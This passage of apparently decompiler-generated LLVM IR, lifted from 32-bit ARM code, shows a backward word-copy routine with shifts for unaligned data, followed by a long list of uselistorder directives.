  store i32 %v5_1755c, i32* %r0.global-to-local, align 4
  %v0_17560 = load i32, i32* %r2.global-to-local, align 4
  %v2_17560 = add i32 %v0_17560, -4
  store i32 %v2_17560, i32* %r2.global-to-local, align 4
  %v6_17564 = icmp slt i32 %v0_17560, 4
  br i1 %v6_17564, label %dec_label_pc_17568.loopexit, label %dec_label_pc_17550

dec_label_pc_17568.loopexit:                      ; preds = %dec_label_pc_17550
  %v4_17560 = sub i32 3, %v0_17560
  %v5_17560 = and i32 %v4_17560, %v0_17560
  %v6_17560 = icmp slt i32 %v5_17560, 0
  %v7_17560 = icmp slt i32 %v2_17560, 0
  store i1 %v6_17560, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_17560, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_17568

dec_label_pc_17568:                               ; preds = %dec_label_pc_17568.loopexit, %dec_label_pc_17544
  %v2_174ac63 = phi i32 [ %v5_1755c, %dec_label_pc_17568.loopexit ], [ %v1_17538, %dec_label_pc_17544 ]
  %v0_1749c59 = phi i32 [ %v2_17560, %dec_label_pc_17568.loopexit ], [ %v2_17548, %dec_label_pc_17544 ]
  %v0_17568 = load i32, i32* %r1.global-to-local, align 4
  %v1_17568 = add i32 %v0_17568, 3
  store i32 %v1_17568, i32* @r1, align 4
  br label %bb143

dec_label_pc_17570:                               ; preds = %dec_label_pc_17500
  br i1 %v5_175e0, label %dec_label_pc_175bc, label %dec_label_pc_17578

dec_label_pc_17578:                               ; preds = %dec_label_pc_17570
  store i32 %v2_175dc, i32* %r2.global-to-local, align 4
  %v3_1757c = load i32, i32* @r4, align 4
  store i32 %v3_1757c, i32* %stack_var_-12, align 4
  %v6_1757c = load i32, i32* @r5, align 4
  %v8_1757c = inttoptr i32 %v6_1757c to i8*
  store i8* %v8_1757c, i8** %stack_var_-8, align 4
  %v11_1757c = load i32, i32* @lr, align 4
  br label %dec_label_pc_17580

dec_label_pc_17580:                               ; preds = %dec_label_pc_17580.dec_label_pc_17580_crit_edge, %dec_label_pc_17578
  %v0_175a4 = phi i32 [ %v1_175a4, %dec_label_pc_17580.dec_label_pc_17580_crit_edge ], [ %v0_1753831, %dec_label_pc_17578 ]
  %v0_17584 = phi i32 [ %v0_17584.pre, %dec_label_pc_17580.dec_label_pc_17580_crit_edge ], [ %v1_174f0, %dec_label_pc_17578 ]
  %v0_17580 = phi i32 [ %v0_17580.pre, %dec_label_pc_17580.dec_label_pc_17580_crit_edge ], [ %v2_174f4, %dec_label_pc_17578 ]
  %v3_17580 = mul i32 %v0_17580, 65536
  store i32 %v3_17580, i32* %lr.global-to-local, align 4
  %v1_17584 = add i32 %v0_17584, -4
  %v2_17584 = inttoptr i32 %v1_17584 to i32*
  %v3_17584 = load i32, i32* %v2_17584, align 4
  store i32 %v3_17584, i32* %r3.global-to-local, align 4
  %v4_17584 = add i32 %v0_17584, -8
  %v5_17584 = inttoptr i32 %v4_17584 to i32*
  %v6_17584 = load i32, i32* %v5_17584, align 4
  store i32 %v6_17584, i32* %r4.global-to-local, align 4
  %v7_17584 = add i32 %v0_17584, -12
  %v8_17584 = inttoptr i32 %v7_17584 to i32*
  %v9_17584 = load i32, i32* %v8_17584, align 4
  store i32 %v9_17584, i32* %r5.global-to-local, align 4
  %v10_17584 = add i32 %v0_17584, -16
  %v11_17584 = inttoptr i32 %v10_17584 to i32*
  %v12_17584 = load i32, i32* %v11_17584, align 4
  store i32 %v10_17584, i32* %r1.global-to-local, align 4
  %v4_17588 = udiv i32 %v12_17584, 65536
  %v5_17588 = or i32 %v4_17588, %v3_17580
  store i32 %v5_17588, i32* %lr.global-to-local, align 4
  %v3_1758c = mul i32 %v12_17584, 65536
  %v4_17590 = udiv i32 %v9_17584, 65536
  %v5_17590 = or i32 %v3_1758c, %v4_17590
  store i32 %v5_17590, i32* @ip, align 4
  %v3_17594 = mul i32 %v9_17584, 65536
  %v4_17598 = udiv i32 %v6_17584, 65536
  %v5_17598 = or i32 %v3_17594, %v4_17598
  store i32 %v5_17598, i32* %r5.global-to-local, align 4
  %v3_1759c = mul i32 %v6_17584, 65536
  %v4_175a0 = udiv i32 %v3_17584, 65536
  %v5_175a0 = or i32 %v3_1759c, %v4_175a0
  store i32 %v5_175a0, i32* %r4.global-to-local, align 4
  %v1_175a4 = add i32 %v0_175a4, -16
  %v2_175a4 = inttoptr i32 %v1_175a4 to i32*
  store i32 %v5_175a0, i32* %v2_175a4, align 4
  %v4_175a4 = add i32 %v0_175a4, -12
  %v5_175a4 = inttoptr i32 %v4_175a4 to i32*
  %v6_175a4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_175a4, i32* %v5_175a4, align 4
  %v7_175a4 = add i32 %v0_175a4, -8
  %v8_175a4 = inttoptr i32 %v7_175a4 to i32*
  %v9_175a4 = load i32, i32* @ip, align 4
  store i32 %v9_175a4, i32* %v8_175a4, align 4
  %v10_175a4 = add i32 %v0_175a4, -4
  %v11_175a4 = inttoptr i32 %v10_175a4 to i32*
  %v12_175a4 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_175a4, i32* %v11_175a4, align 4
  store i32 %v1_175a4, i32* %r0.global-to-local, align 4
  %v0_175a8 = load i32, i32* %r2.global-to-local, align 4
  %v2_175a8 = add i32 %v0_175a8, -16
  store i32 %v2_175a8, i32* %r2.global-to-local, align 4
  %v6_175ac = icmp slt i32 %v0_175a8, 16
  br i1 %v6_175ac, label %dec_label_pc_175b0, label %dec_label_pc_17580.dec_label_pc_17580_crit_edge

dec_label_pc_17580.dec_label_pc_17580_crit_edge:  ; preds = %dec_label_pc_17580
  %v0_17580.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_17584.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17580

dec_label_pc_175b0:                               ; preds = %dec_label_pc_17580
  %v2_175b0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_175b0, i32* @r4, align 4
  %v5_175b0 = load i8*, i8** %stack_var_-8, align 4
  %v6_175b0 = ptrtoint i8* %v5_175b0 to i32
  store i32 %v6_175b0, i32* @r5, align 4
  store i32 %v11_1757c, i32* @lr, align 4
  %v2_175b4 = add i32 %v0_175a8, -4
  store i32 %v2_175b4, i32* %r2.global-to-local, align 4
  %v4_175b4 = add i32 %v0_175a8, 2147483632
  %v5_175b4 = and i32 %v2_175b4, %v4_175b4
  %v6_175b4 = icmp slt i32 %v5_175b4, 0
  store i1 %v6_175b4, i1* %cpsr_v.global-to-local, align 1
  %v7_175b4 = icmp slt i32 %v2_175b4, 0
  store i1 %v7_175b4, i1* %cpsr_n.global-to-local, align 1
  %v5_175b8 = icmp slt i32 %v2_175a8, -12
  br i1 %v5_175b8, label %dec_label_pc_175d4, label %dec_label_pc_175bc

dec_label_pc_175bc:                               ; preds = %dec_label_pc_175b0, %dec_label_pc_17570, %dec_label_pc_175bc
  %v1_175c8 = phi i32 [ %v5_175c8, %dec_label_pc_175bc ], [ %v1_175a4, %dec_label_pc_175b0 ], [ %v0_1753831, %dec_label_pc_17570 ]
  %v0_175bc = load i32, i32* %r3.global-to-local, align 4
  %v3_175bc = mul i32 %v0_175bc, 65536
  store i32 %v3_175bc, i32* %ip.global-to-local, align 4
  %v0_175c0 = load i32, i32* %r1.global-to-local, align 4
  %v1_175c0 = add i32 %v0_175c0, -4
  %v2_175c0 = inttoptr i32 %v1_175c0 to i32*
  %v3_175c0 = load i32, i32* %v2_175c0, align 4
  store i32 %v3_175c0, i32* %r3.global-to-local, align 4
  store i32 %v1_175c0, i32* %r1.global-to-local, align 4
  %v4_175c4 = udiv i32 %v3_175c0, 65536
  %v5_175c4 = or i32 %v4_175c4, %v3_175bc
  store i32 %v5_175c4, i32* @ip, align 4
  %v2_175c8 = add i32 %v1_175c8, -4
  %v3_175c8 = inttoptr i32 %v2_175c8 to i32*
  store i32 %v5_175c4, i32* %v3_175c8, align 4
  %v4_175c8 = load i32, i32* %r0.global-to-local, align 4
  %v5_175c8 = add i32 %v4_175c8, -4
  store i32 %v5_175c8, i32* %r0.global-to-local, align 4
  %v0_175cc = load i32, i32* %r2.global-to-local, align 4
  %v2_175cc = add i32 %v0_175cc, -4
  store i32 %v2_175cc, i32* %r2.global-to-local, align 4
  %v6_175d0 = icmp slt i32 %v0_175cc, 4
  br i1 %v6_175d0, label %dec_label_pc_175d4.loopexit, label %dec_label_pc_175bc

dec_label_pc_175d4.loopexit:                      ; preds = %dec_label_pc_175bc
  %v4_175cc = sub i32 3, %v0_175cc
  %v5_175cc = and i32 %v4_175cc, %v0_175cc
  %v6_175cc = icmp slt i32 %v5_175cc, 0
  %v7_175cc = icmp slt i32 %v2_175cc, 0
  store i1 %v6_175cc, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_175cc, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_175d4

dec_label_pc_175d4:                               ; preds = %dec_label_pc_175d4.loopexit, %dec_label_pc_175b0
  %v2_174ac64 = phi i32 [ %v5_175c8, %dec_label_pc_175d4.loopexit ], [ %v1_175a4, %dec_label_pc_175b0 ]
  %v0_1749c60 = phi i32 [ %v2_175cc, %dec_label_pc_175d4.loopexit ], [ %v2_175b4, %dec_label_pc_175b0 ]
  %v0_175d4 = load i32, i32* %r1.global-to-local, align 4
  %v1_175d4 = add i32 %v0_175d4, 2
  store i32 %v1_175d4, i32* @r1, align 4
  br label %bb143

dec_label_pc_175dc:                               ; preds = %dec_label_pc_174f0
  br i1 %v5_175e0, label %dec_label_pc_17628, label %dec_label_pc_175e4

dec_label_pc_175e4:                               ; preds = %dec_label_pc_175dc
  store i32 %v2_175dc, i32* %r2.global-to-local, align 4
  %v3_175e8 = load i32, i32* @r4, align 4
  store i32 %v3_175e8, i32* %stack_var_-12, align 4
  %v6_175e8 = load i32, i32* @r5, align 4
  %v8_175e8 = inttoptr i32 %v6_175e8 to i8*
  store i8* %v8_175e8, i8** %stack_var_-8, align 4
  %v11_175e8 = load i32, i32* @lr, align 4
  br label %dec_label_pc_175ec

dec_label_pc_175ec:                               ; preds = %dec_label_pc_175ec.dec_label_pc_175ec_crit_edge, %dec_label_pc_175e4
  %v0_17610 = phi i32 [ %v1_17610, %dec_label_pc_175ec.dec_label_pc_175ec_crit_edge ], [ %v0_1753831, %dec_label_pc_175e4 ]
  %v0_175f0 = phi i32 [ %v0_175f0.pre, %dec_label_pc_175ec.dec_label_pc_175ec_crit_edge ], [ %v1_174f0, %dec_label_pc_175e4 ]
  %v0_175ec = phi i32 [ %v0_175ec.pre, %dec_label_pc_175ec.dec_label_pc_175ec_crit_edge ], [ %v2_174f4, %dec_label_pc_175e4 ]
  %v3_175ec = mul i32 %v0_175ec, 16777216
  store i32 %v3_175ec, i32* %lr.global-to-local, align 4
  %v1_175f0 = add i32 %v0_175f0, -4
  %v2_175f0 = inttoptr i32 %v1_175f0 to i32*
  %v3_175f0 = load i32, i32* %v2_175f0, align 4
  store i32 %v3_175f0, i32* %r3.global-to-local, align 4
  %v4_175f0 = add i32 %v0_175f0, -8
  %v5_175f0 = inttoptr i32 %v4_175f0 to i32*
  %v6_175f0 = load i32, i32* %v5_175f0, align 4
  store i32 %v6_175f0, i32* %r4.global-to-local, align 4
  %v7_175f0 = add i32 %v0_175f0, -12
  %v8_175f0 = inttoptr i32 %v7_175f0 to i32*
  %v9_175f0 = load i32, i32* %v8_175f0, align 4
  store i32 %v9_175f0, i32* %r5.global-to-local, align 4
  %v10_175f0 = add i32 %v0_175f0, -16
  %v11_175f0 = inttoptr i32 %v10_175f0 to i32*
  %v12_175f0 = load i32, i32* %v11_175f0, align 4
  store i32 %v10_175f0, i32* %r1.global-to-local, align 4
  %v4_175f4 = udiv i32 %v12_175f0, 256
  %v5_175f4 = or i32 %v4_175f4, %v3_175ec
  store i32 %v5_175f4, i32* %lr.global-to-local, align 4
  %v3_175f8 = mul i32 %v12_175f0, 16777216
  %v4_175fc = udiv i32 %v9_175f0, 256
  %v5_175fc = or i32 %v3_175f8, %v4_175fc
  store i32 %v5_175fc, i32* @ip, align 4
  %v3_17600 = mul i32 %v9_175f0, 16777216
  %v4_17604 = udiv i32 %v6_175f0, 256
  %v5_17604 = or i32 %v3_17600, %v4_17604
  store i32 %v5_17604, i32* %r5.global-to-local, align 4
  %v3_17608 = mul i32 %v6_175f0, 16777216
  %v4_1760c = udiv i32 %v3_175f0, 256
  %v5_1760c = or i32 %v3_17608, %v4_1760c
  store i32 %v5_1760c, i32* %r4.global-to-local, align 4
  %v1_17610 = add i32 %v0_17610, -16
  %v2_17610 = inttoptr i32 %v1_17610 to i32*
  store i32 %v5_1760c, i32* %v2_17610, align 4
  %v4_17610 = add i32 %v0_17610, -12
  %v5_17610 = inttoptr i32 %v4_17610 to i32*
  %v6_17610 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_17610, i32* %v5_17610, align 4
  %v7_17610 = add i32 %v0_17610, -8
  %v8_17610 = inttoptr i32 %v7_17610 to i32*
  %v9_17610 = load i32, i32* @ip, align 4
  store i32 %v9_17610, i32* %v8_17610, align 4
  %v10_17610 = add i32 %v0_17610, -4
  %v11_17610 = inttoptr i32 %v10_17610 to i32*
  %v12_17610 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_17610, i32* %v11_17610, align 4
  store i32 %v1_17610, i32* %r0.global-to-local, align 4
  %v0_17614 = load i32, i32* %r2.global-to-local, align 4
  %v2_17614 = add i32 %v0_17614, -16
  store i32 %v2_17614, i32* %r2.global-to-local, align 4
  %v6_17618 = icmp slt i32 %v0_17614, 16
  br i1 %v6_17618, label %dec_label_pc_1761c, label %dec_label_pc_175ec.dec_label_pc_175ec_crit_edge

dec_label_pc_175ec.dec_label_pc_175ec_crit_edge:  ; preds = %dec_label_pc_175ec
  %v0_175ec.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_175f0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_175ec

dec_label_pc_1761c:                               ; preds = %dec_label_pc_175ec
  %v2_1761c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1761c, i32* @r4, align 4
  %v5_1761c = load i8*, i8** %stack_var_-8, align 4
  %v6_1761c = ptrtoint i8* %v5_1761c to i32
  store i32 %v6_1761c, i32* @r5, align 4
  store i32 %v11_175e8, i32* @lr, align 4
  %v2_17620 = add i32 %v0_17614, -4
  store i32 %v2_17620, i32* %r2.global-to-local, align 4
  %v4_17620 = add i32 %v0_17614, 2147483632
  %v5_17620 = and i32 %v2_17620, %v4_17620
  %v6_17620 = icmp slt i32 %v5_17620, 0
  store i1 %v6_17620, i1* %cpsr_v.global-to-local, align 1
  %v7_17620 = icmp slt i32 %v2_17620, 0
  store i1 %v7_17620, i1* %cpsr_n.global-to-local, align 1
  %v5_17624 = icmp slt i32 %v2_17614, -12
  br i1 %v5_17624, label %dec_label_pc_17640, label %dec_label_pc_17628

dec_label_pc_17628:                               ; preds = %dec_label_pc_1761c, %dec_label_pc_175dc, %dec_label_pc_17628
  %v1_17634 = phi i32 [ %v5_17634, %dec_label_pc_17628 ], [ %v1_17610, %dec_label_pc_1761c ], [ %v0_1753831, %dec_label_pc_175dc ]
  %v0_17628 = load i32, i32* %r3.global-to-local, align 4
  %v3_17628 = mul i32 %v0_17628, 16777216
  store i32 %v3_17628, i32* %ip.global-to-local, align 4
  %v0_1762c = load i32, i32* %r1.global-to-local, align 4
  %v1_1762c = add i32 %v0_1762c, -4
  %v2_1762c = inttoptr i32 %v1_1762c to i32*
  %v3_1762c = load i32, i32* %v2_1762c, align 4
  store i32 %v3_1762c, i32* %r3.global-to-local, align 4
  store i32 %v1_1762c, i32* %r1.global-to-local, align 4
  %v4_17630 = udiv i32 %v3_1762c, 256
  %v5_17630 = or i32 %v4_17630, %v3_17628
  store i32 %v5_17630, i32* @ip, align 4
  %v2_17634 = add i32 %v1_17634, -4
  %v3_17634 = inttoptr i32 %v2_17634 to i32*
  store i32 %v5_17630, i32* %v3_17634, align 4
  %v4_17634 = load i32, i32* %r0.global-to-local, align 4
  %v5_17634 = add i32 %v4_17634, -4
  store i32 %v5_17634, i32* %r0.global-to-local, align 4
  %v0_17638 = load i32, i32* %r2.global-to-local, align 4
  %v2_17638 = add i32 %v0_17638, -4
  store i32 %v2_17638, i32* %r2.global-to-local, align 4
  %v6_1763c = icmp slt i32 %v0_17638, 4
  br i1 %v6_1763c, label %dec_label_pc_17640.loopexit, label %dec_label_pc_17628

dec_label_pc_17640.loopexit:                      ; preds = %dec_label_pc_17628
  %v4_17638 = sub i32 3, %v0_17638
  %v5_17638 = and i32 %v4_17638, %v0_17638
  %v6_17638 = icmp slt i32 %v5_17638, 0
  %v7_17638 = icmp slt i32 %v2_17638, 0
  store i1 %v6_17638, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_17638, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_17640

dec_label_pc_17640:                               ; preds = %dec_label_pc_17640.loopexit, %dec_label_pc_1761c
  %v2_174ac65 = phi i32 [ %v5_17634, %dec_label_pc_17640.loopexit ], [ %v1_17610, %dec_label_pc_1761c ]
  %v0_1749c61 = phi i32 [ %v2_17638, %dec_label_pc_17640.loopexit ], [ %v2_17620, %dec_label_pc_1761c ]
  %v0_17640 = load i32, i32* %r1.global-to-local, align 4
  %v1_17640 = add i32 %v0_17640, 1
  store i32 %v1_17640, i32* @r1, align 4
  br label %bb143

; uselistorder directives
  uselistorder i32 %v5_17634, { 0, 2, 1 }
  uselistorder i32 %v3_17628, { 1, 0 }
  uselistorder i32 %v2_17620, { 0, 2, 1, 3 }
  uselistorder i32 %v1_17610, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_175f0, { 1, 0 }
  uselistorder i32 %v3_175ec, { 1, 0 }
  uselistorder i32 %v0_175f0, { 3, 2, 1, 0 }
  uselistorder i32 %v0_17610, { 3, 2, 1, 0 }
  uselistorder i32 %v5_175c8, { 0, 2, 1 }
  uselistorder i32 %v3_175bc, { 1, 0 }
  uselistorder i32 %v2_175b4, { 0, 2, 1, 3 }
  uselistorder i32 %v1_175a4, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_17584, { 1, 0 }
  uselistorder i32 %v3_17580, { 1, 0 }
  uselistorder i32 %v0_17584, { 3, 2, 1, 0 }
  uselistorder i32 %v0_175a4, { 3, 2, 1, 0 }
  uselistorder i32 %v5_1755c, { 0, 2, 1 }
  uselistorder i32 %v3_17550, { 1, 0 }
  uselistorder i32 %v2_17548, { 0, 2, 1, 3 }
  uselistorder i32 %v1_17538, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_17518, { 1, 0 }
  uselistorder i32 %v3_17514, { 1, 0 }
  uselistorder i32 %v0_17518, { 3, 2, 1, 0 }
  uselistorder i32 %v0_17538, { 3, 2, 1, 0 }
  uselistorder i1 %v5_175e0, { 2, 0, 1 }
  uselistorder i32 %v0_174f8, { 1, 0 }
  uselistorder i32 %v0_175e4, { 3, 0, 2, 1 }
  uselistorder i32 %v0_1753831, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_174e8, { 2, 1, 0 }
  uselistorder i32 %v0_174e8, { 2, 0, 1 }
  uselistorder i32 %v2_174e0, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_174e0, { 1, 0, 2 }
  uselistorder i32 %v0_174e0, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1753832, { 2, 1, 0 }
  uselistorder i32 %v11_174bc, { 1, 0 }
  uselistorder i32 %v7_174bc, { 1, 0 }
  uselistorder i32 %v1_1749c, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_1749c, { 1, 2, 0, 3 }
  uselistorder i32 %v2_174a0, { 1, 0 }
  uselistorder i32 %v7_17494, { 0, 2, 1 }
  uselistorder i32 %v10_17490, { 1, 0 }
  uselistorder i32 %v9_17488, { 1, 0, 2 }
  uselistorder i32 %v6_17484, { 1, 0 }
  uselistorder i32 %v2_1747c, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v0_1747c, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_1748c, { 0, 3, 2, 1 }
  uselistorder i32 %v7_17470, { 0, 2, 1 }
  uselistorder i32 %v13_1746c, { 1, 0 }
  uselistorder i32 %v4_17468, { 0, 2, 1, 3 }
  uselistorder i32 %v0_17468, { 2, 0, 1 }
  uselistorder i32 %v6_17470, { 0, 3, 2, 1 }
  uselistorder i32 %v7_17460, { 0, 2, 1 }
  uselistorder i32 %v16_1745c, { 1, 0 }
  uselistorder i32 %v4_17458, { 1, 0 }
  uselistorder i32 %v0_17468.pr, { 1, 3, 0, 2 }
  uselistorder i32 %v6_17460, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_1744c, { 0, 3, 2, 1 }
  uselistorder i32 %v10_17448, { 1, 0 }
  uselistorder i32 %v1_17444, { 1, 0 }
  uselistorder i32 %v10_17440, { 1, 0 }
  uselistorder i32 %v0_17440, { 3, 2, 1, 0 }
  uselistorder i32 %v0_17444, { 0, 1, 2, 3, 7, 6, 5, 4 }
  uselistorder i32 %v2_17438, { 0, 2, 1 }
  uselistorder i32 %v2_1742c, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_1742c, { 1, 2, 5, 0, 4, 3 }
  uselistorder i32 %v0_1744449, { 1, 2, 0 }
  uselistorder i32 %v1_17424, { 2, 1, 0 }
  uselistorder i32 %v1_1741c, { 2, 3, 1, 0 }
  uselistorder i32 %v2_17414, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v2_17410, { 3, 4, 1, 2, 0, 5 }
  uselistorder i32 %v2_1740c, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v1_1740c, { 3, 0, 5, 4, 1, 2 }
  uselistorder i32 %v4_173f8, { 0, 2, 1 }
  uselistorder i32 %v3_173ec, { 1, 0 }
  uselistorder i32 %v2_173e4, { 0, 2, 1, 3 }
  uselistorder i32 %v12_173d4, { 1, 0, 3, 2 }
  uselistorder i32 %v8_173b4, { 1, 0, 2 }
  uselistorder i32 %v5_173b4, { 1, 0, 2 }
  uselistorder i32 %v2_173b4, { 1, 0, 2 }
  uselistorder i32 %v3_173b0, { 1, 0 }
  uselistorder i32 %v0_173b4, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_173d4, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v4_1738c, { 0, 2, 1 }
  uselistorder i32 %v3_17380, { 1, 0 }
  uselistorder i32 %v2_17378, { 0, 2, 1, 3 }
  uselistorder i32 %v12_17368, { 1, 0, 3, 2 }
  uselistorder i32 %v8_17348, { 1, 0, 2 }
  uselistorder i32 %v5_17348, { 1, 0, 2 }
  uselistorder i32 %v2_17348, { 1, 0, 2 }
  uselistorder i32 %v3_17344, { 1, 0 }
  uselistorder i32 %v0_17348, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_17368, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v4_17320, { 0, 2, 1 }
  uselistorder i32 %v3_17314, { 1, 0 }
  uselistorder i32 %v2_1730c, { 0, 2, 1, 3 }
  uselistorder i32 %v12_172fc, { 1, 0, 3, 2 }
  uselistorder i32 %v8_172dc, { 1, 0, 2 }
  uselistorder i32 %v5_172dc, { 1, 0, 2 }
  uselistorder i32 %v2_172dc, { 1, 0, 2 }
  uselistorder i32 %v3_172d8, { 1, 0 }
  uselistorder i32 %v0_172dc, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_172fc, { 4, 3, 2, 1, 0 }
  uselistorder i1 %v5_173a4, { 2, 0, 1 }
  uselistorder i32 %v0_173a8, { 3, 0, 2, 1 }
  uselistorder i32 %v0_172fc75, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_172ac, { 1, 0 }
  uselistorder i32 %v0_172ac, { 3, 1, 0, 2 }
  uselistorder i32 %v2_172a4, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_172a4, { 1, 0, 2 }
  uselistorder i32 %v0_172a4, { 2, 0, 1, 3 }
  uselistorder i32 %v0_172fc76, { 2, 1, 0 }
  uselistorder i32 %v1_17284, { 1, 0, 2 }
  uselistorder i32 %v1_1725c, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_1725c, { 1, 2, 0, 3 }
  uselistorder i32 %v8_17248, { 1, 0, 2 }
  uselistorder i32 %v6_17244, { 1, 0 }
  uselistorder i32 %v2_1723c, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v0_1723c, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_1724c, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v4_17234, { 0, 2, 1 }
  uselistorder i1 %v0_17234, { 1, 0 }
  uselistorder i1 %v1_17234, { 1, 0 }
  uselistorder i32 %v3_17230, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_17228, { 0, 2, 1, 3 }
  uselistorder i32 %v4_17214, { 1, 0 }
  uselistorder i32 %v12_17208, { 0, 1, 3, 2 }
  uselistorder i32 %v0_171fc, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_17200, { 0, 1, 2, 3, 4, 5, 6, 7, 12, 11, 10, 9, 8 }
  uselistorder i32 %v2_171f0, { 0, 2, 1 }
  uselistorder i32 %v2_171e8, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_171e8, { 1, 2, 5, 0, 4, 3 }
  uselistorder i32 %v1_171e0, { 1, 0 }
  uselistorder i32 %v1_171d8, { 2, 1, 0 }
  uselistorder i32 %v2_171d0, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v0_171d0, { 1, 0, 2, 3 }
  uselistorder i32 %v2_171c0, { 1, 0 }
  uselistorder i32 %v1_171c0, { 1, 5, 3, 4, 0, 6, 8, 2, 7, 9 }
  uselistorder i32 %v0_171c0, { 1, 7, 9, 8, 6, 4, 0, 5, 11, 2, 3, 10, 12 }
  uselistorder i8** %stack_var_-8, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r5.global-to-local, { 10, 11, 12, 13, 14, 15, 16, 17, 0, 7, 8, 9, 1, 2, 3, 4, 5, 6 }
  uselistorder i32* %r4.global-to-local, { 22, 23, 24, 25, 26, 0, 1, 2, 3, 4, 5, 6, 19, 20, 21, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %r3.global-to-local, { 31, 33, 32, 34, 35, 37, 36, 38, 40, 39, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 29, 30, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28 }
  uselistorder i32* %r2.global-to-local, { 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 69, 68, 0, 1, 16, 2, 4, 3, 5, 6, 7, 8, 9, 10, 12, 11, 13, 14, 15, 17, 47, 48, 49, 50, 51, 52, 18, 43, 19, 20, 21, 22, 23, 44, 24, 25, 26, 27, 28, 45, 29, 31, 30, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 46 }
  uselistorder i32* %r1.global-to-local, { 26, 24, 27, 25, 28, 32, 29, 31, 30, 33, 35, 36, 34, 0, 1, 2, 3, 4, 21, 19, 22, 20, 23, 7, 5, 13, 6, 8, 11, 9, 14, 10, 12, 15, 16, 17, 18 }
  uselistorder i32* %r0.global-to-local, { 51, 52, 53, 54, 55, 56, 57, 59, 60, 3, 4, 5, 6, 7, 19, 8, 10, 9, 11, 12, 58, 13, 14, 20, 15, 16, 17, 18, 21, 47, 49, 50, 22, 29, 23, 24, 30, 25, 26, 27, 28, 31, 32, 0, 33, 34, 36, 35, 37, 38, 48, 39, 40, 41, 44, 42, 43, 45, 46, 1, 2 }
  uselistorder i32* %lr.global-to-local, { 11, 12, 13, 14, 15, 16, 17, 18, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32* %ip.global-to-local, { 11, 12, 13, 0, 1, 9, 10, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i1* %cpsr_v.global-to-local, { 6, 39, 3, 41, 4, 42, 40, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 5, 17, 18, 19, 0, 37, 1, 20, 2, 21, 38, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36 }
  uselistorder i1* %cpsr_n.global-to-local, { 6, 45, 3, 47, 4, 48, 46, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 5, 18, 19, 20, 21, 22, 0, 43, 1, 23, 2, 24, 44, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42 }
  uselistorder i32 -24, { 1, 2, 3, 0 }
  uselistorder i32 2147483632, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32 -5, { 1, 0, 2 }
  uselistorder i32 27, { 1, 0, 2 }
  uselistorder i32 -28, { 1, 2, 0 }
  uselistorder label %dec_label_pc_17628, { 2, 0, 1 }
  uselistorder label %dec_label_pc_175bc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17550, { 2, 1, 0 }
  uselistorder label %dec_label_pc_174f0, { 1, 0 }
  uselistorder label %.thread26, { 2, 0, 1 }
  uselistorder label %.thread122, { 1, 0 }
  uselistorder label %bb143, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %dec_label_pc_1747c, { 1, 0 }
  uselistorder label %.thread16, { 1, 0 }
  uselistorder label %.thread14, { 1, 0 }
  uselistorder label %dec_label_pc_17440, { 1, 0 }
  uselistorder label %dec_label_pc_1742c, { 1, 0 }
  uselistorder label %dec_label_pc_173ec, { 2, 0, 1 }
